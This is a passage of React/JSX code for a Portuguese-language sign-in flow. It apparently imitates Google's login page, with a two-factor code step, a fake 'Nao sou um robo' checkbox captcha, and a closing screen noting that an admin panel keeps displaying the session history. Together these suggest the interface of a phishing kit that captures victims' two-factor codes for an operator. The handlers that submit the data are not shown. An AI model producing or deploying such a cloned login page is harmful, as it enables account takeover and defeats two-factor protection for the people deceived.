                          fontSize: twoFactorFocused || twoFactorCode ? 12 : 14,
                          fontWeight: 400,
                          pointerEvents: "none",
                          background: "#0E0E0E",
                          padding: "0 4px",
                          lineHeight: 1,
                        }}>
                          {twoFactorText.label}
                        </label>
                      </div>

                      <label style={{ display: "flex", alignItems: "center", gap: 12, cursor: "pointer" }} onClick={() => setTrustedDevice(v => !v)}>
                        <input type="checkbox" checked={trustedDevice} onChange={() => {}} style={{ position: "absolute", opacity: 0, width: 1, height: 1, pointerEvents: "none" }} />
                        <span
                          aria-hidden="true"
                          style={{
                            width: 18, height: 18, borderRadius: 3,
                            border: trustedDevice ? "1px solid #8ab4f8" : "1px solid #5f6368",
                            background: trustedDevice ? "#8ab4f8" : "transparent",
                            display: "inline-flex", alignItems: "center", justifyContent: "center",
                            flexShrink: 0,
                          }}
                        >
                          {trustedDevice && <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M3.2 8.1 6.3 11.2 12.8 4.8" stroke="#0E0E0E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg>}
                        </span>
                        <span style={{ color: "#e8eaed", fontSize: 14, fontWeight: 400 }}>Não perguntar novamente neste dispositivo</span>
                      </label>
                      {twoFactorError && (
                        <p style={{ color: "#f28b82", fontSize: 13, margin: "8px 0 0 4px" }}>{twoFactorError}</p>
                      )}
                    </div>

                    <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 24, marginTop: 48 }}>
                      <button onClick={handleTryAnotherWay} disabled={loadingBar} style={{ color: "#a8c7fa", fontSize: 14, fontWeight: 500, background: "none", border: "none", cursor: "pointer", padding: 0 }}>
                        Tentar de outro jeito
                      </button>
                      <button onClick={handleTwoFactorSubmit} disabled={loadingBar} style={{
                        background: loadingBar ? "#3c4043" : "#a8c7fa", color: loadingBar ? "#9aa0a6" : "#062e6f", borderRadius: 20,
                        fontSize: 14, fontWeight: 500, border: "none", cursor: loadingBar ? "not-allowed" : "pointer",
                        padding: "10px 28px",
                      }}>
                        Avançar
                      </button>
                    </div>
                  </motion.div>
                )}

                {step === "captcha" && (
                  <motion.div
                    key="captcha-form"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", marginLeft: "auto", flex: 1 }}>
                      <p style={{ color: "#e8eaed", fontSize: 16, margin: "0 0 20px 0" }}>
                        Verificacao adicional
                      </p>

                      <label
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 14,
                          border: "1px solid #5f6368",
                          borderRadius: 12,
                          padding: "18px 16px",
                          cursor: "pointer",
                        }}
                      >
                        <input
                          type="checkbox"
                          checked={captchaChecked}
                          onChange={(e) => setCaptchaChecked(e.target.checked)}
                          style={{ width: 18, height: 18 }}
                        />
                        <span style={{ color: "#e8eaed", fontSize: 15 }}>Nao sou um robo</span>
                      </label>
                    </div>

                    <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 20, marginTop: 48 }}>
                      <button onClick={handleCaptchaSubmit} style={{
                        background: "#a8c7fa", color: "#062e6f", borderRadius: 20,
                        fontSize: 14, fontWeight: 500, border: "none", cursor: "pointer",
                        padding: "10px 28px",
                      }}>
                        Finalizar
                      </button>
                    </div>
                  </motion.div>
                )}

                {step === "complete" && (
                  <motion.div
                    key="complete"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    style={{ display: "flex", flexDirection: "column", height: "100%" }}
                  >
                    <div style={{ maxWidth: 460, width: "100%", marginLeft: "auto", flex: 1 }}>
                      <p style={{ color: "#e8eaed", fontSize: 18, margin: "0 0 12px 0" }}>
                        Etapas concluidas
                      </p>
                      <p style={{ color: "#bdc1c6", fontSize: 14, lineHeight: 1.6, margin: 0 }}>
                        O fluxo foi finalizado. O painel admin continua exibindo o historico da sessao.
                      </p>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </div>
        </div>
      </div>

      <div className="flex flex-col sm:flex-row items-center justify-between px-10 py-4 gap-3" style={{ maxWidth: 1060, width: "100%", margin: "0 auto" }}>
        <button className="flex items-center gap-1" style={{
          color: "#e8eaed", fontWeight: 400, background: "none", border: "none",
          cursor: "pointer", fontSize: 13, padding: "6px 10px", borderRadius: 4,
        }}>
          Português (Brasil)
          <ChevronDown size={13} style={{ marginLeft: 2 }} />
        </button>

        <div className="flex items-center gap-6">
          {["Ajuda", "Privacidade", "Termos"].map((label) => (
            <Link key={label} href="#" style={{ color: "#e8eaed", fontWeight: 400, fontSize: 13, textDecoration: "none" }}>
              {label}
            </Link>
          ))}
        </div>
      </div>
    </div>
  );
}
